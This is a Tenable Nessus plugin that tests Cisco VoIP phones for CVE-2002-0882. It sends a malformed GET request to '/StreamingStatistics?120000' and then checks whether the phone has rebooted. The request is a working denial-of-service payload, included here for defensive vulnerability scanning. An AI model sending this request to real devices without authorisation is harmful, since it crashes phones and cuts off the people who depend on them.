#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: this domain no longer exists)
#      Added BugtraqID and CAN
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(11013);
  script_version("1.36");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2002-0882");
  script_bugtraq_id(4794, 4798);

  script_name(english:"Cisco VoIP Phone Multiple Script Malformed Request DoS");

  script_set_attribute(attribute:"synopsis", value:
"The remote IP phone has multiple vulnerabilities.");
  script_set_attribute(attribute:"description", value:
"The remote host appears to be a Cisco IP phone. It was possible to
reboot this device by requesting :

 http://<phone-ip>/StreamingStatistics?120000

This device likely has other vulnerabilities that Nessus has not
checked for.");
  script_set_attribute(attribute:"see_also", value:"https://seclists.org/bugtraq/2002/May/209");
  # https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20020522-ip-phone-vulnerability
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?87e8244d");
  script_set_attribute(attribute:"solution", value:
"Apply the fix referenced in the vendor's advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2002/05/23");
  script_set_attribute(attribute:"patch_publication_date", value:"2002/05/22");
  script_set_attribute(attribute:"plugin_publication_date", value:"2002/06/05");

  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/h:cisco:voip_phone_cp");
  script_set_attribute(attribute:"cpe", value:"cpe:/o:cisco:voip_phone_cp");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_KILL_HOST);
  script_family(english:"CISCO");

  script_copyright(english:"This script is Copyright (C) 2002-2022 Tenable Network Security, Inc.");

  script_dependencies("find_service1.nasl", "no404.nasl", "http_version.nasl");
  script_require_keys("Settings/ParanoidReport");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_http_port(default:80);

# we don't use start_denial/end_denial because they
# might be too slow (the phone takes 15 seconds to reboot)

alive = tcp_ping(port:port);
if (! alive) exit(0);
r = http_send_recv3(method:"GET", item:"/StreamingStatistics?120000", port:port);
sleep(5);
alive = tcp_ping(port:port);
if (! alive) security_hole(port);


